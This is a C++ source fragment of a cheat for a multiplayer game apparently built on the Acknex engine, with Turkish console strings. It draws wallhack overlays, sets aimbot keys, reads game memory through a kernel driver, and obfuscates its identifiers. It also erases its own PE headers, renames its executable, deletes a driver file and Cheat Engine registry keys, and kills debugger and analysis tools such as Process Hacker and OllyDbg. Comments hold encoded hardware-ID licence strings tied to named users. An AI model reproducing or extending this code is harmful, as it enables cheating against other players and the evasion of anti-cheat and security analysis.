												DrawLine(vNeck.x, vNeck.y, vSpine2.x, vSpine2.y, &Col.green, 1);
												DrawLine(vSpine2.x, vSpine2.y, vSpine.x, vSpine.y, &Col.green, 1);
												DrawLine(vSpine.x, vSpine.y, vPelvis.x, vPelvis.y, &Col.green, 1);

												DrawLine(vNeck.x, vNeck.y, vR_UpArm.x, vR_UpArm.y, &Col.green, 1);
												DrawLine(vR_UpArm.x, vR_UpArm.y, vR_ForeArm.x, vR_ForeArm.y, &Col.green, 1);
												DrawLine(vR_ForeArm.x, vR_ForeArm.y, vR_Hand.x, vR_Hand.y, &Col.green, 1);

												DrawLine(vNeck.x, vNeck.y, vL_UpArm.x, vL_UpArm.y, &Col.green, 1);
												DrawLine(vL_UpArm.x, vL_UpArm.y, vL_ForeArm.x, vL_ForeArm.y, &Col.green, 1);
												DrawLine(vL_ForeArm.x, vL_ForeArm.y, vL_Hand.x, vL_Hand.y, &Col.green, 1);

												DrawLine(vPelvis.x, vPelvis.y, vR_Thigh.x, vR_Thigh.y, &Col.green, 1);
												DrawLine(vR_Thigh.x, vR_Thigh.y, vR_Calf.x, vR_Calf.y, &Col.green, 1);
												DrawLine(vR_Calf.x, vR_Calf.y, vR_Foot.x, vR_Foot.y, &Col.green, 1);

												DrawLine(vPelvis.x, vPelvis.y, vL_Thigh.x, vL_Thigh.y, &Col.green, 1);
												DrawLine(vL_Thigh.x, vL_Thigh.y, vL_Calf.x, vL_Calf.y, &Col.green, 1);
												DrawLine(vL_Calf.x, vL_Calf.y, vL_Foot.x, vL_Foot.y, &Col.green, 1);
											}
										}*/
										if (Moi.Esp.Box)
											Box3D(RootPos, &Col.moi_red, 1.7);

										if (Moi.Esp.Line)
											DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, vFeet.x, vFeet.y + 20, &Col.moi_green, 1);

										if (Moi.Esp.LookDirection)
											EspLookDirection(pEntity, HeadPoz);

										if (Moi.Esp.Distance)
											DrawStrokeText(vFeet.x - (strlen(xdist) * 7 / 2), vFeet.y, &Col.moi_green, xdist);

										if (Moi.Esp.Radar)
											DrawRadar(LocalPos, RootPos, &Col.moi_red);
									}
									else
									{

										if (tSelect == 1)
										{
											// Team
											if (Moi.Esp.Box)
												Box3D(RootPos, &Col.moi_blue, 1.7);

											if (Moi.Esp.Radar)
												DrawRadar(LocalPos, RootPos, &Col.moi_blue);
										}
									}
								}
							}
							else
							{
								if (ZulaTeam && GladioTeam)
								{
									/*if (Moi.Esp.Skeleton)
									{
										if (vis_check != 67109648 && vis_check2 != 67109648 && vis_check3 != 67109648)
										{
											DrawLine(vNeck.x, vNeck.y, vSpine2.x, vSpine2.y, &Col.DarkYellow, 1.5);
											DrawLine(vSpine2.x, vSpine2.y, vSpine.x, vSpine.y, &Col.DarkYellow, 1.5);
											DrawLine(vSpine.x, vSpine.y, vPelvis.x, vPelvis.y, &Col.DarkYellow, 1.5);

											DrawLine(vNeck.x, vNeck.y, vR_UpArm.x, vR_UpArm.y, &Col.DarkYellow, 1.5);
											DrawLine(vR_UpArm.x, vR_UpArm.y, vR_ForeArm.x, vR_ForeArm.y, &Col.DarkYellow, 1.5);
											DrawLine(vR_ForeArm.x, vR_ForeArm.y, vR_Hand.x, vR_Hand.y, &Col.DarkYellow, 1.5);

											DrawLine(vNeck.x, vNeck.y, vL_UpArm.x, vL_UpArm.y, &Col.DarkYellow, 1.5);
											DrawLine(vL_UpArm.x, vL_UpArm.y, vL_ForeArm.x, vL_ForeArm.y, &Col.DarkYellow, 1.5);
											DrawLine(vL_ForeArm.x, vL_ForeArm.y, vL_Hand.x, vL_Hand.y, &Col.DarkYellow, 1.5);

											DrawLine(vPelvis.x, vPelvis.y, vR_Thigh.x, vR_Thigh.y, &Col.DarkYellow, 1.5);
											DrawLine(vR_Thigh.x, vR_Thigh.y, vR_Calf.x, vR_Calf.y, &Col.DarkYellow, 1.5);
											DrawLine(vR_Calf.x, vR_Calf.y, vR_Foot.x, vR_Foot.y, &Col.DarkYellow, 1.5);

											DrawLine(vPelvis.x, vPelvis.y, vL_Thigh.x, vL_Thigh.y, &Col.DarkYellow, 1.5);
											DrawLine(vL_Thigh.x, vL_Thigh.y, vL_Calf.x, vL_Calf.y, &Col.DarkYellow, 1.5);
											DrawLine(vL_Calf.x, vL_Calf.y, vL_Foot.x, vL_Foot.y, &Col.DarkYellow, 1.5);
										}
									}*/
									if (Moi.Esp.Box)
										Box3D(RootPos, &Col.moi_red, 1.7);

									if (Moi.Esp.Line)
										DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, vFeet.x, vFeet.y + 20, &Col.moi_green, 1);

									if (Moi.Esp.LookDirection)
										EspLookDirection(pEntity, HeadPoz);

									if (Moi.Esp.Distance)
										DrawStrokeText(vFeet.x - (strlen(xdist) * 7 / 2), vFeet.y, &Col.moi_green, xdist);

									if (Moi.Esp.Radar)
										DrawRadar(LocalPos, RootPos, &Col.moi_red);
								}
							}
						}
						else
						{
							if (tSelect == 0)
							{
								if (ZulaTeam)
								{
									if (Moi.Esp.Box)
										Box3D(RootPos, &Col.moi_red, 1.7);

									if (Moi.Esp.Line)
										DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, vFeet.x, vFeet.y + 20, &Col.moi_green, 1);

									if (Moi.Esp.LookDirection)
										EspLookDirection(pEntity, HeadPoz);

									if (Moi.Esp.Distance)
										DrawStrokeText(vFeet.x - (strlen(xdist) * 7 / 2), vFeet.y, &Col.moi_green, xdist);

									if (Moi.Esp.Radar)
										DrawRadar(LocalPos, RootPos, &Col.moi_red);
								}
							}

							if (tSelect == 1)
							{
								if (GladioTeam)
								{
									if (Moi.Esp.Box)
										Box3D(RootPos, &Col.moi_red, 1.7);

									if (Moi.Esp.Line)
										DrawLine(ScreenCenterX, ScreenCenterY + ScreenCenterY, vFeet.x, vFeet.y + 20, &Col.moi_green, 1);

									if (Moi.Esp.LookDirection)
										EspLookDirection(pEntity, HeadPoz);

									if (Moi.Esp.Distance)
										DrawStrokeText(vFeet.x - (strlen(xdist) * 7 / 2), vFeet.y, &Col.moi_green, xdist);

									if (Moi.Esp.Radar)
										DrawRadar(LocalPos, RootPos, &Col.moi_red);
								}
							}
						}
					}
				}
			}
		}
		//}
		if (hAimKey == 0) AimbotKey = VK_LSHIFT;
		if (hAimKey == 1) AimbotKey = VK_CAPITAL;
		if (hAimKey == 2) AimbotKey = VK_LBUTTON;
		if (hAimKey == 3) AimbotKey = VK_RBUTTON;
		if (hAimKey == 4) AimbotKey = VK_LCONTROL;
		if (hAimKey == 5) AimbotKey = LVKF_ALT;
		if (hAimKey == 6) AimbotKey = 'X';
		if (hAimKey == 7) AimbotKey = 'F';
		if (hAimKey == 8) AimbotKey = 'T';
		if (hAimKey == 9) AimbotKey = 'C';
		if (hAimKey == 10) AimbotKey = 'G';
		if (hAimKey == 11) AimbotKey = NULL;


		if (Moi.xqweqwfac.ON)
		{
			//int die = readmem<int>(entityx + 0x24);
			//if (die == 0)
			asdfaewfacd();

		}
	}
}
DWORD f_pid(std::string processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		CloseHandle(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			CloseHandle(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}
	memset((void*)&processName[0], 0x00, processName.size() * 2);
	processName.clear();
	CloseHandle(processesSnapshot);
	return 0;
}
#define asdfsadvs GetWindowThreadProcessId


std::string RandomHWID(size_t length = 0)
{
	static const std::string allowed_chars{ "0123456789abcdefghjklmnoprstuvqyzA" };

	static thread_local std::default_random_engine randomEngine(std::random_device{}());
	static thread_local std::uniform_int_distribution<int> randomDistribution(0, allowed_chars.size() - 1);

	std::string id(length ? length : 32, '\0');

	for (std::string::value_type& c : id) {
		c = allowed_chars[randomDistribution(randomEngine)];
	}

	return id;
}
#define ar _m_u_t_a_t_i_o_n_()
#define arx ar
#define arxd arx
#define arxdd arxd
#define arxddd arxdd
#define arxdddd arxddd
#define arxddddd arxdddd
#define arxdddddd arxddddd
#define arxddddddd arxdddddd
#define arxdddddddd arxddddddd
DWORD p2 = NULL;
bool kaka = false;
bool active = true;

bool ahahahaha = true;
bool bkr = false;
bool check_game()
{
	DWORD pidx = 0;

	for (;;)
	{
		HWND fW = FindWindow(XorString("acknex_mainwin"), 0);
		asdfsadvs(fW, &pidx);
		if (pidx != 0)
		{
			Console::Success(XorString("Oyun bulundu! !"));
			return true;
			break;
		}
		else
		{
			if (!bkr) {
				Console::Warning(XorString("Oyun bekleniyor."));
				bkr = true;
			}
		}
	}
}
void _g_p_i_d_()
{
	bool adads = true;
	std::wstring xw = std::wstring(L"nex");
	while (p == 0)
	{
		if (adads)
		{
			Sleep(1000);
			std::wstring yw = (std::wstring(L"ack") + xw + std::wstring(L"_main") + std::wstring(L"win"));
			const wchar_t* ptr = yw.c_str();
			asdfsadvs(FindWindowW((wchar_t*)ptr, 0), &p);
			memset((void*)&ptr[0], 0x00, yw.size() * 2);
			yw.clear();
		}
		Sleep(10);
	}
	//Console::Success(XorString("Pid: %X"), p);
	adads = false;
}
void _m_u_t_a_t_i_o_n_()
{
	J();
	SetConsoleTitleA(RandomHWID(20).c_str());
	J();

	while (active)
	{
		if (ahahahaha)
		{
			if (!check_game())
				continue;
			J();
			Console::Info(XorString("Lutfen bekleyin."));
			Sleep(1000);
			_g_p_i_d_();
			ahahahaha = false;
		}
		else
		{
			J();
			cqwevqwxe ciktiyapisi;
			J();
			ciktiyapisi.pid = p;
			J();
			unsigned long int okunan_bayt_miktari;
			J();
			if (!DIC(drv, CTL_CODE(FILE_DEVICE_UNKNOWN, 0x852, METHOD_BUFFERED, FILE_SPECIAL_ACCESS), &ciktiyapisi, sizeof ciktiyapisi, &ciktiyapisi, sizeof ciktiyapisi, &okunan_bayt_miktari, nullptr))
			{
				J();
				exit(-1);
			}
			J();
			base = (unsigned long long int)ciktiyapisi.data;
			system(XorString("cls"));
			J();
			xqwerafcsdfaser();
		}
		Sleep(10);
	}
	active = false;

	//while (!kaka)
	//{
	//	Sleep(1000);
	//	//J()
	//	auto haha = FindWindow(XorString("acknex_mainwin"), 0);
	//	GetWindowThreadProcessId(haha, &p2);
	//	if (p2 != NULL)
	//	{
	//		p = p2;
	//		p2 = 0;
	//		kaka = true;
	//	}

	//}
}

void TakeScreenShot(const std::string& path)
{
	//setting to the screen shot
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
	keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

	//handler of the bitmap that save the screen shot
	HBITMAP hBitmap;

	//I have to give for it time to make it work
	Sleep(100);

	//take the screen shot
	OpenClipboard(NULL);

	//save the screen shot in the bitmap handler 
	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);

	//relese the screen shot
	CloseClipboard();

	std::vector<BYTE> buf;
	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;

	// screenshot to jpg and save to stream
	image.Attach(hBitmap);
	image.Save(stream, Gdiplus::ImageFormatJPEG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[0], len);
	stream->Release();

	// put the imapge in the file
	std::fstream fi;
	fi.open(path, std::fstream::binary | std::fstream::out);
	fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
	fi.close();
}
#define mx int __stdcall main(int argc, char** argv)
#define x mx
#define q x
#define R q
#define p dc()
#define pi p
#define pic pi

const char* getMAC() {
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
	char* mac_addr = (char*)malloc(18);

	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	if (AdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		free(mac_addr);
		return NULL; // it is safe to call free(NULL)
	}

	// Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
		if (AdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			free(mac_addr);
			return NULL;
		}
	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		// Contains pointer to current adapter info
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;

		// technically should look at pAdapterInfo->AddressLength
		//   and not assume it is 6.
		sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
			pAdapterInfo->Address[0], pAdapterInfo->Address[1],
			pAdapterInfo->Address[2], pAdapterInfo->Address[3],
			pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
		//printf("mac: %s\n", mac_addr);
		// print them all, return the last one.
		// return mac_addr;

		//printf("\n");
		//pAdapterInfo = pAdapterInfo->Next;
	}
	free(AdapterInfo);
	return mac_addr; // caller must free.
}


R
{
	char f[_MAX_PATH + 1];
		GetModuleFileNameA(GetModuleHandle(0), f, _MAX_PATH);
		J();
		rename(f, std::string(RandomHWID(20) + ".exe").c_str());
		J();

		J();
		remove(XorString("VSTXRAID.sys"));
		RegistryDeleteKey(HKEY_CURRENT_USER, XorString("Software\\Cheat Engine"));
		::EnumWindows(EnumWindowsProc, NULL);
		if (pic) arxdddddddd;

}
// SARSILMAZ: b6KUENJXFZFTl84MDg2JkRFVl9BMzcwJlNVQlNZU18wMDM0ODA4Ng==LxQ5MDA6MDU6QTk6Mjc6RkY6OTY
// Zumba: b6KVlBOVkE=LxQ5MDQ6OTI6MjY6MTk6OUY6M0I===
// uzayl1: b6KUENJXFZFTl8xMEVDJkRFVl84MTM2JlJFVl8wNQ==LxQ5Mzg6NjA6Nzc6MTY6RjQ6Rjg===
// Lia?: b6KUENJXFZFTl8xMEVDJkRFVl84MTY4JlNVQlNZU183ODE3MTQ2MiZSRVZfMEM=LxQ5NEU6NTM6NTA6NEY6NEY6NDM===
// RZGR: b6KUENJXFZFTl8xMEVDJkRFVl84MTY4JlNVQlNZU184MTE3MTAxOSZSRVZfMTU=LxQ5RjQ6NEQ6MzA6QUM6M0Q6Q0I===
// Efecan: b6KUENJXFZFTl8xOTY5JkRFVl9FMEIxLxQ5NEM6Q0M6NkE6RTI6NkY6QkY===
// LegendMareS: b6KUENJXFZFTl8xOTY5JkRFVl8yMDYyJlNVQlNZU184MTUyMTAxOSZSRVZfQzE=LxQ5RUM6QTg6NkI6RDk6MzE6REY===

void DeleteHeaders(HINSTANCE hModule)
{
	PIMAGE_DOS_HEADER pDoH;
	PIMAGE_NT_HEADERS pNtH;
	DWORD i, ersize, protect;

	if (!hModule) return;
	pDoH = (PIMAGE_DOS_HEADER)(hModule);
	pNtH = (PIMAGE_NT_HEADERS)((LONG)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	ersize = sizeof(IMAGE_DOS_HEADER);
	if (VirtualProtect(pDoH, ersize, PAGE_READWRITE, &protect))
		for (i = 0; i < ersize; i++)
			*(BYTE*)((BYTE*)pDoH + i) = 0;

	ersize = sizeof(IMAGE_NT_HEADERS);
	if (pNtH && VirtualProtect(pNtH, ersize, PAGE_READWRITE, &protect))
		for (i = 0; i < ersize; i++)
			*(BYTE*)((BYTE*)pNtH + i) = 0;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	char class_name[80];
	char title[80];
	GetClassName(hwnd, class_name, sizeof(class_name));
	GetWindowText(hwnd, title, sizeof(title));
	if (strstr(class_name, XorString("WindowsForms10.Window")) ||
		strstr(class_name, XorString("WindowsForms8")) ||
		strstr(class_name, XorString("WindowsForms8.1")) ||
		strstr(class_name, XorString("HintWindow")) ||
		strstr(class_name, XorString("LCLListBox")) ||
		//strstr(class_name, XorString("QEventDispatcher")) ||
		//strstr(class_name, XorString("Qt5QWindowIcon")) ||		
		strstr(class_name, XorString("TFormMain.UnicodeClass")) ||
		strstr(class_name, XorString("TFormDebugStrings")) ||
		strstr(class_name, XorString("ProcessHacker")) ||
		strstr(title, XorString("Sigma")) ||
		strstr(class_name, XorString("Olly")) ||
		strstr(class_name, XorString("TMainForm")))
	{
		DWORD pdclass = 0; DWORD pdwindow = 0;
		HWND wind = FindWindow(NULL, title);
		GetWindowThreadProcessId(wind, &pdwindow);

		HWND clas = FindWindow(class_name, NULL);
		GetWindowThreadProcessId(clas, &pdclass);
		//cout << class_name << " - " << hex << pdclass << "|| window: " << hex << pdwindow << std::endl;
		kill_by_pid((int)pdclass); kill_by_pid((int)pdwindow);
	}	
	return TRUE;
}